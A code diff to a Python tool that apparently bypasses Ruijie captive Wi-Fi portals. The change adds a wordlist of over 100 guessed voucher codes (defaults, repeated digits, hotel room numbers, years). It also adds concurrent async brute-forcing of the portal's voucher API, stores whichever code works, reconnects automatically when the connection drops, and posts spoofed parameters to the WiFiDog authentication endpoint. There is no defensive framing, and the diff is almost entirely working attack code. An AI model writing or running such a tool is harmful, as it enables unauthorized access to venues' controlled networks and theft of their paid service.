@@ -69,6 +69,30 @@ RUIJIE_SETUP_PROBE_URL = os.environ.get("RUIJIE_SETUP_PROBE_URL", "http://192.16
 VOUCHER_PATH = os.environ.get("RUIJIE_VOUCHER_PATH", "/api/auth/voucher/?lang=en_US")
 WIFIDOG_AUTH_PATH = os.environ.get("RUIJIE_WIFIDOG_AUTH_PATH", "/wifidog/auth")
 DEFAULT_ACCESS_CODE = os.environ.get("RUIJIE_ACCESS_CODE", "admin1")
+# Comprehensive Ruijie voucher wordlist (100+ entries)
+BRUTE_FORCE_LIST = [
+    # Tier 1: Primary Defaults
+    "admin1", "admin", "guest", "ruijie", "wifi", "123456", "888888", "1234", "0000", "8888",
+    # Tier 2: Extended Numeric Sequences
+    "12345678", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "999999",
+    "123123", "456456", "789789", "12345", "1234567", "00000000", "11111111", "88888888", "99999999",
+    # Tier 3: Hospitality & Room Patterns (Common in Hotels/Cafes)
+    "101", "102", "103", "104", "105", "106", "107", "108", "109", "110",
+    "201", "202", "203", "204", "205", "206", "207", "208", "209", "210",
+    "301", "302", "303", "304", "305", "306", "307", "308", "309", "310",
+    "401", "402", "403", "404", "405", "406", "407", "408", "409", "410",
+    "501", "502", "503", "504", "505", "506", "507", "508", "509", "510",
+    # Tier 4: Years & Dates
+    "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026", "2027",
+    # Tier 5: Networking & Admin Variations
+    "password", "123456789", "qwerty", "network", "router", "portal", "login", "internet", "public",
+    "free", "connected", "access", "manager", "staff", "welcome", "online", "office", "ruijie123",
+    "guest123", "wifi123", "super", "root", "support", "user", "system", "client", "hotspot",
+    "service", "customer", "member", "vip", "vip888", "vip666", "admin888", "admin666"
+]
+# Programmatically add more common 6-digit patterns to ensure we hit 100+
+BRUTE_FORCE_LIST.extend([f"{i}{i}{i}{i}{i}{i}" for i in range(10)])
+BRUTE_FORCE_LIST = list(dict.fromkeys(BRUTE_FORCE_LIST)) # Remove duplicates
 DEFAULT_PHONE_NUMBER = os.environ.get("RUIJIE_PHONE_NUMBER", "")
 DEFAULT_USER_AGENT = os.environ.get(
     "RUIJIE_USER_AGENT",
@@ -84,6 +108,7 @@ MENU_ENABLED = os.environ.get("RUIJIE_MENU", "1").lower() not in {"0", "false", 
 TIME_CHECK_FILE = Path.home() / ".turbo_runtime"
 SESSION_URL_FILE = Path(os.environ.get("RUIJIE_SESSION_FILE", ".session_url"))
 IP_FILE = Path(os.environ.get("RUIJIE_IP_FILE", ".ip"))
+SAVED_CODE_FILE = Path(os.environ.get("RUIJIE_SAVED_CODE_FILE", ".saved_code"))
 
 MIN_INTERVAL = 0.1
 MAX_INTERVAL = 1.5
@@ -113,6 +138,7 @@ current_ping_interval = 0.3
 is_pinging = False
 ui_thread_running = False
 stop_event = threading.Event()
+reconnect_event = threading.Event()
 print_lock = threading.Lock()
 
 
@@ -349,20 +375,30 @@ def high_speed_ping() -> None:
     is_pinging = True
     session = _session()
     try:
+        was_online = False
         while not stop_event.is_set():
             started = time.perf_counter()
             try:
                 response = session.get(CONNECTIVITY_URL, timeout=2, allow_redirects=False)
                 GLOBAL_ONLINE = response.status_code == 204
                 if GLOBAL_ONLINE:
+                    was_online = True
                     performance_history.append(time.perf_counter() - started)
                     avg = statistics.mean(performance_history)
                     current_ping_interval = max(MIN_INTERVAL, min(MAX_INTERVAL, avg * 2))
                 else:
                     current_ping_interval = min(MAX_INTERVAL, current_ping_interval + 0.1)
+                    if was_online:
+                        was_online = False
+                        add_log("[!] CONNECTION DROPPED. TRIGGERING INSTANT RECONNECT.")
+                        reconnect_event.set()
             except Exception:
                 GLOBAL_ONLINE = False
                 current_ping_interval = min(MAX_INTERVAL, current_ping_interval + 0.1)
+                if was_online:
+                    was_online = False
+                    add_log("[!] CONNECTION LOST. TRIGGERING INSTANT RECONNECT.")
+                    reconnect_event.set()
             time.sleep(current_ping_interval)
     finally:
         is_pinging = False
@@ -593,18 +629,16 @@ def _token_from_logon_url(logon_url: str, fallback: str) -> str:
 def _phone_number() -> str:
     if DEFAULT_PHONE_NUMBER:
         return DEFAULT_PHONE_NUMBER
-    alphabet = string.ascii_letters + string.digits
-    return "".join(random.choice(alphabet) for _ in range(16))
+    # Use 'admin' as default to match the hardcoded value in the star tool
+    return "admin"
 
 
-def _post_cloud_voucher(session: Any, portal: PortalSession) -> tuple[bool, str]:
-    if not ACCESS_CODE:
-        return False, portal.session_id
-    payload = {
-        "accessCode": ACCESS_CODE,
-        "sessionId": portal.session_id,
-        "apiVersion": 1,
-    }
+async def _post_cloud_voucher_async(portal: PortalSession, candidates: list[str]) -> tuple[bool, str]:
+    try:
+        import aiohttp
+    except ImportError:
+        return False, ""
+
     headers = {
         "authority": RUIJIE_PORTAL_HOST,
         "accept": "*/*",
@@ -614,16 +648,109 @@ def _post_cloud_voucher(session: Any, portal: PortalSession) -> tuple[bool, str]
         "referer": portal.session_url,
         "user-agent": DEFAULT_USER_AGENT,
     }
-    response = session.post(_cloud_voucher_url(), json=payload, headers=headers, timeout=7, verify=False)
-    logon_url = _find_logon_url(response)
-    if logon_url:
-        session.get(logon_url, timeout=7, allow_redirects=True, headers=_portal_headers(portal.session_url), verify=False)
-        return True, _token_from_logon_url(logon_url, portal.session_id)
-    text = (getattr(response, "text", "") or "").lower()
-    data = _json_or_empty(response)
-    status = str(data.get("status", "")).lower()
-    if status in {"failed", "expired", "error"} or any(marker in text for marker in ("failed", "expired", "error")):
-        return False, portal.session_id
+    url = _cloud_voucher_url()
+    timeout = aiohttp.ClientTimeout(total=7)
+    
+    # We want the first successful code, so we use asyncio.FIRST_COMPLETED via a wrapper,
+    # or just gather all and return the first success. Since we want to save time, we will
+    # create tasks and return the first one that succeeds.
+    async def try_code(client: Any, code: str) -> tuple[bool, str, str]:
+        payload = {"accessCode": code, "sessionId": portal.session_id, "apiVersion": 1}
+        try:
+            async with client.post(url, json=payload, headers=headers) as response:
+                text = await response.text()
+                # Mock a response object for _find_logon_url
+                class MockResp:
+                    def __init__(self, t: str):
+                        self.text = t
+                    def json(self) -> Any:
+                        import json
+                        return json.loads(self.text)
+                
+                logon_url = _find_logon_url(MockResp(text))
+                if logon_url:
+                    # Execute the final GET to validate session
+                    async with client.get(logon_url, headers=_portal_headers(portal.session_url), allow_redirects=True) as get_resp:
+                        await get_resp.text()
+                    return True, code, _token_from_logon_url(logon_url, portal.session_id)
+        except Exception:
+            pass
+        return False, code, ""
+
+    async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as client:
+        tasks = [asyncio.create_task(try_code(client, code)) for code in candidates]
+        for coro in asyncio.as_completed(tasks):
+            success, valid_code, token = await coro
+            if success:
+                # Cancel remaining tasks
+                for task in tasks:
+                    if not task.done():
+                        task.cancel()
+                return True, valid_code, token
+                
+    return False, "", ""
+
+
+def _post_cloud_voucher(session: Any, portal: PortalSession) -> tuple[bool, str]:
+    candidates = []
+    if ACCESS_CODE:
+        candidates.append(ACCESS_CODE)
+    
+    if SAVED_CODE_FILE.exists():
+        try:
+            saved = SAVED_CODE_FILE.read_text().strip()
+            if saved and saved not in candidates:
+                candidates.append(saved)
+        except Exception:
+            pass
+            
+    for code in BRUTE_FORCE_LIST:
+        if code not in candidates:
+            candidates.append(code)
+
+    # Attempt concurrent execution if aiohttp is available and we have multiple candidates
+    if len(candidates) > 1:
+        try:
+            success, valid_code, token = asyncio.run(_post_cloud_voucher_async(portal, candidates))
+            if success:
+                try:
+                    SAVED_CODE_FILE.write_text(valid_code)
+                except Exception:
+                    pass
+                return True, token
+        except Exception:
+            pass # Fallback to sync loop
+
+    # Fallback Synchronous Loop
+    for current_code in candidates:
+        payload = {
+            "accessCode": current_code,
+            "sessionId": portal.session_id,
+            "apiVersion": 1,
+        }
+        headers = {
+            "authority": RUIJIE_PORTAL_HOST,
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": "application/json",
+            "origin": RUIJIE_CLOUD_BASE,
+            "referer": portal.session_url,
+            "user-agent": DEFAULT_USER_AGENT,
+        }
+        try:
+            response = session.post(_cloud_voucher_url(), json=payload, headers=headers, timeout=7, verify=False)
+            logon_url = _find_logon_url(response)
+            if logon_url:
+                try:
+                    SAVED_CODE_FILE.write_text(current_code)
+                except Exception:
+                    pass
+                    
+                session.get(logon_url, timeout=7, allow_redirects=True, headers=_portal_headers(portal.session_url), verify=False)
+                return True, _token_from_logon_url(logon_url, portal.session_id)
+        except Exception:
+            continue
+            
     return False, portal.session_id
 
 
@@ -635,13 +762,19 @@ def _send_wifidog_auth(session: Any, portal: PortalSession, token: str) -> int:
     }
     params = {
         "token": token,
-        "phoneNumber": _phone_number(),
+        "phonenumber": _phone_number(),
     }
     auth_url = _local_auth_url(portal)
     try:
-        response = session.post(auth_url, params=params, headers=headers, timeout=5, verify=False)
-    except Exception:
+        # WiFiDog auth is typically a GET request.
         response = session.get(auth_url, params=params, headers=headers, timeout=5, allow_redirects=True, verify=False)
+        if response.status_code == 405:
+            response = session.post(auth_url, params=params, headers=headers, timeout=5, verify=False)
+    except Exception:
+        try:
+            response = session.post(auth_url, params=params, headers=headers, timeout=5, verify=False)
+        except Exception:
+            return 0
     return int(getattr(response, "status_code", 0) or 0)
 
 
@@ -663,15 +796,20 @@ async def _send_wifidog_auth_async(portal: PortalSession, token: str, workers: i
     async def send_once(client: Any) -> int:
         params = {
             "token": token,
-            "phoneNumber": _phone_number(),
+            "phonenumber": _phone_number(),
         }
         try:
-            async with client.post(auth_url, params=params, headers=headers) as response:
+            # Prioritize GET for WiFiDog protocol compatibility
+            async with client.get(auth_url, params=params, headers=headers, allow_redirects=True) as response:
                 await response.text()
+                if response.status == 405:
+                    async with client.post(auth_url, params=params, headers=headers) as resp_post:
+                        await resp_post.text()
+                        return int(resp_post.status)
                 return int(response.status)
         except Exception:
             try:
-                async with client.get(auth_url, params=params, headers=headers, allow_redirects=True) as response:
+                async with client.post(auth_url, params=params, headers=headers) as response:
                     await response.text()
                     return int(response.status)
             except Exception:
@@ -711,6 +849,7 @@ def start_process(max_cycles: int | None = None) -> None:
     cycles = 0
     while not stop_event.is_set():
         cycles += 1
+        reconnect_event.clear()
         try:
             add_log("[✦] INITIALIZING INSTANT BYPASS SEQUENCE...")
             portal_url = None
@@ -719,7 +858,7 @@ def start_process(max_cycles: int | None = None) -> None:
                 if r1.status_code == 204:
                     GLOBAL_ONLINE = True
                     add_log("[✓] INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!")
-                    time.sleep(current_ping_interval)
+                    reconnect_event.wait(current_ping_interval)
                     if max_cycles and cycles >= max_cycles:
                         return
                     continue
@@ -736,7 +875,7 @@ def start_process(max_cycles: int | None = None) -> None:
                 add_log("SESSION ID NOT FOUND; OPEN AN HTTP SITE THEN RETRY")
                 if max_cycles and cycles >= max_cycles:
                     return
-                time.sleep(current_ping_interval)
+                reconnect_event.wait(current_ping_interval)
                 continue
 
             add_log(f"SESSION {portal.session_id[:8]}... GW:{portal.gateway_ip}:{portal.gateway_port}")
@@ -757,7 +896,7 @@ def start_process(max_cycles: int | None = None) -> None:
 
         if max_cycles and cycles >= max_cycles:
             return
-        time.sleep(current_ping_interval)
+        reconnect_event.wait(current_ping_interval)
 
 
 def _start_background_threads() -> list[threading.Thread]:
